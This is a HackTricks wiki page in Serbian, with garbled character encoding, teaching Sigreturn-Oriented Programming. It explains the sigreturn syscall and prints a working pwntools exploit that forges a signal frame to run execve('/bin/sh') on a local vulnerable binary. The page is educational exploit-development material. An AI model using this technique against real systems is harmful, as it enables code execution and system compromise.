# SROP - Sigreturn-Oriented Programming

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 游눫 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

**`Sigreturn`** je posebna **syscall** koja se prvenstveno koristi za 캜i코캖enje nakon 코to signalni handler zavr코i svoju izvr코avanje. Signali su prekidi koje operativni sistem 코alje programu, 캜esto da bi ukazali na to da se dogodila neka izuzetna situacija. Kada program primi signal, privremeno pauzira svoj trenutni rad da bi obradio signal pomo캖u **signal handler-a**, posebne funkcije dizajnirane za rad sa signalima.

Nakon 코to signalni handler zavr코i, program treba da **nastavi svoje prethodno stanje** kao da se ni코ta nije dogodilo. Tu dolazi do izra쬬ja **`sigreturn`**. Poma쬰 programu da **vrati iz signal handler-a** i obnavlja stanje programa 캜i코캖enjem steka (odeljak memorije koji 캜uva pozive funkcija i lokalne promenljive) koji je koristio signalni handler.

Zanimljiv deo je kako **`sigreturn`** obnavlja stanje programa: to 캜ini tako 코to 캜uva **sve vrednosti CPU registara na steku.** Kada signal vi코e nije blokiran, **`sigreturn` uklanja ove vrednosti sa steka**, efikasno resetuju캖i registre CPU-a na njihovo stanje pre nego 코to je signal obra캠en. Ovo uklju캜uje registar pokaziva캜a steka (RSP), koji pokazuje na trenutni vrh steka.

{% hint style="danger" %}
Pozivaju캖i syscall **`sigreturn`** iz ROP lanca i **dodaju캖i vrednosti registara** koje bismo 쬰leli da u캜itamo u **stek**, mogu캖e je **kontrolisati** sve vrednosti registara i stoga **pozvati** na primer syscall `execve` sa `/bin/sh`.
{% endhint %}

Obratite pa쬹ju na to kako bi ovo bila **vrsta Ret2syscall** koja olak코ava kontrolu parametara za pozivanje drugih Ret2syscall-a:

{% content-ref url="rop-syscall-execv.md" %}
[rop-syscall-execv.md](rop-syscall-execv.md)
{% endcontent-ref %}

Za bolje obja코njenje pogledajte tako캠e:

{% embed url="https://youtu.be/ADULSwnQs-s?feature=shared" %}

## Example

Mo쬰te [**prona캖i primer ovde**](https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop/using-srop), iako je ovo kona캜ni exploit odatle:
```python
from pwn import *

elf = context.binary = ELF('./vuln', checksec=False)
p = process()

BINSH = elf.address + 0x1250
POP_RAX = 0x41018
SYSCALL_RET = 0x41015

frame = SigreturnFrame()
frame.rax = 0x3b            # syscall number for execve
frame.rdi = BINSH           # pointer to /bin/sh
frame.rsi = 0x0             # NULL
frame.rdx = 0x0             # NULL
frame.rip = SYSCALL_RET

payload = b'A' * 8
payload += p64(POP_RAX)
payload += p64(0xf)
payload += p64(SYSCALL_RET)
payload += bytes(frame)

p.sendline(payload)
p.interactive()
```
## Reference

* [https://youtu.be/ADULSwnQs-s?feature=shared](https://youtu.be/ADULSwnQs-s?feature=shared)
* [https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop](https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop)

{% hint style="success" %}
U캜ite i ve쬭ajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
U캜ite i ve쬭ajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podr쬴te HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
